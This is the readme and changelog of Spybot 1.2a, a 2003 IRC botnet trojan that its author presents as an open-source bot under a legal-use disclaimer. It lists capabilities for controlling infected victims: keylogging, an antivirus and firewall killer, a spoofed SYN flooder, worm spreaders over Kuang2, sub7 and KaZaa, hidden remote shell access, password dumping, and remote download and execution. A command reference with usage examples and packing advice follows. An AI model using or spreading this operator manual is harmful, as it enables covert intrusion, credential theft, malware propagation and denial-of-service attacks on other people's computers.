//////////////////////////////////////////////////////////
//							//
//		Spybot1.2a by Mich			//
//							//
//		Opensource irc bot 			//
//							//
//	    IRC: irc.babbels.com #dreams		//
//	    						//
//	http://members.lycos.co.uk/ircspybot/		//
//	    						//
//	      opensource_bot@hotmail.com		//
//	    						//
//		use at your own risk.			//
//							//
//	       Good luck and have fun!			//
//							//
//////////////////////////////////////////////////////////

Disclaimer

Spybot is meant to be used for legal purposes only.  Since it is beyond the author's control of what Spybot is used for, the author of Spybot can not be held accountable for anything you do with this source.




Date: 21:04:2003

- Spoofd syn flooder only win 2000 and xp and only if user is logged in as administator (source comes from Tesla's sdbot edition only better :p ) 

- Web Download

- Nickname match login

- Ident match login

- Silent opion so the bot doesnt give a reply just add -s at the end of the command example: killthread 2 -s

- Change server (changes back after reboot)

- uninstall option

- opion for encrypted commands (find out yourself how it works) 

- Fixed a bug the server sometimes craches when there was a lot of activity in the channel (i hope i have fixed it)

- Added a option to give a command in the room for only 1 bot example: Mich threads (and only Mich gives a responce) you can also use the bots version example: spybot1.2b quit and all bots with version spybot1.2b will quit

- Spy redirects all travic from the irc server to the dcc chat 

- Option for the scanner to scan ranges like 12.x.x.x (changes the x for a random number) 

Date: 08:04:2003

Fixed the kuang spreader 


Date: 05:04:2003

Features: 

- HTTP server
Bot has now a build in http server with option to set rootdir and port 
example: if you set port t0 81 and rootdir to c:\ and you go to url http://victums.ip.address.com:81/ then it will list al files
and dirs in the c:\ dir (same as a filemanager)

- Threads list list of all running threads and option to kill a thread

- Port scanner

- Syn flooder

- Kuang2 and sub7 spreader 

- KaZaa spreader

- Remote cmd.exe runs cmd.exe hidden on the remote pc this allows you to do commands like netstat ftp telnet etc. etc. (doesnt work on win9x as far as i know)

- Keylogger Online and offline keylogger

- PortRedirect

- List processes  
Shows al running processes. 
You can kill a process.

- AV/Firewall killer

- DCC Send
You can send a file to the bot with the normal dcc send option in mIRC (only tested it with mIRC6.03 get it from www.mirc.com)

- Get File
Download a file from the bot’s pc (the bot will start a dcc send)

- DCC Chat
Just normal dcc chat option in mIRC all commands will also work here, use this if you want do giff a command that has a lot of output most irc servers will disconnect the bot if it sends a lot of data.

- List files
List al files and dirs within your sears query example list c:\windows\*.exe will list al .exe files in the windows dir

- Hostmask match login
When you do the login [password] commands the bot checks if your hostmask matches a hostmask in the trusted hosts list (settings.h). if not you cant login 


- Raw Commands (on connect and onjoin)
Bot reads a list of raw commands when its connected or joins a channel
Example:
On join:
	MODE $CHAN +nts
	MODE $CHAN +k trojanforge
On Connect
	MODE $NICK +I

- Computer info
Gives some pc info including ip address
 
- Topic commands
Option to gif the bot a command with the topic (when the bot joins the channel)

- Lists the passwords (only win 9x)
- Execute, delete, rename file And make dir
- Sendkeys 
- Open/close cd-rom
- Reboot pc
- Disconnect for x sec.
- Reconnect
- Quit 
- Raw commands


Commands list

Login password
raw [raw command]							(example: raw PRIVMSG #spybot1.1 :hello)
list [path+filter]	  						(example: list c:\*.*)
delete [filename]							(example: delete c:\windows\netstat.exe)
execute [filename]
rename [origenamfile] [newfile]						(example: rename c:\windows\netstat.exe c:\windows\netstatbackup.bak)
makedir [dirname]							(example: makedir c:\test\  )
startkeylogger 								(info: starts onlinekeylogger and output's to the channel\query\dcc chat)
stopkeylogger
sendkeys [keys]								(info: simulates keypresses, to simulate return hit ctrl+b (bold in mIRC) and for backspace ctrl+u (underlined in mIRC))
keyboardlights								(info: flashes his keyboard lights 50x)
info									(info: gives some info)
passwords								(info: lists the ras passwords in win 9x)
listprocesses								(info: lists all running proccesses)
killprocess [processname] 						(example: killprocess taskmgr.exe)   NOTE: if with listprocesses the entire path shows up you must use it with killprocess to)
reconnect
disconnect [sec.]							(info: disconnect the bot for x sec. if sec. is not given it disconnect the bot for 30mins.)
quit									(info: bot quits running)
reboot
cd-rom [0/1]								(info: opens\close cd-rom. cd-rom 1 = open cd-rom 0 = close)
httpserver [port] [root-dir]         					(example: httpserver 81 c:\)
syn [host] [port] [delay msec.] [times]					(example: syn 127.0.0.1 80 100 1000)
redirect [input port] [host] [output port]				(example: redirect 100 eu.undernet.org 6667)
threads									(info: will list al threads)
killthread [number]							(info: kills the selected thread)
get [filename]								(example: get c:\windows\system\keylogs.txt will trigger a dcc send on the remote pc)
opencmd									(info: starts cmd.exe on the  remote pc hidden)
cmd [command]								(info: sends a command to cmd.exe example: cmd netstat -an)
scan [start ip address] [port] [delay] [filename] 
example: scan 127.0.0.1 17300 1 portscan.txt 
download [url] [filename]						(example: download http://127.0.0.1/server.exe c:\server.exe)
server [new server address]						(example: server 127.0.0.1)
uninstall								(info: uninstalls server note: it doesnt delete the server only removes the startupkeys)
spy									(info: redirects all travic from the irc server to the dcc chat (only works with dcc chat)
stopspy									(info: stops the spy)

filename is optional when used result will be logged to the filename, if ip is 0 a random ip is generated

DCC

DCC chat & DCC send & DCC get works with any normal irc client in mIRC the command is: /dcc chat [nickname] and: dcc send [nickname]


Compiling

I have only test it with lcc-win32 if you dont have it download it from http://www.q-software-solutions.com

if you have lcc just run "make spybot.bat" (make sure the lcc dir is c:\lcc\ )
You can pack it with UPX or fsg packer i use fsg and packet size is 17kb


If you found bugs or have question or commends mail to opensource_bot@hotmail.com or go to irc.babbels.com #dreams


Disclaimer

Spybot is meant to be used for legal purposes only.  Since it is beyond the author's control of what Spybot is used for, the author of Spybot can not be held accountable for anything you do with this source.




 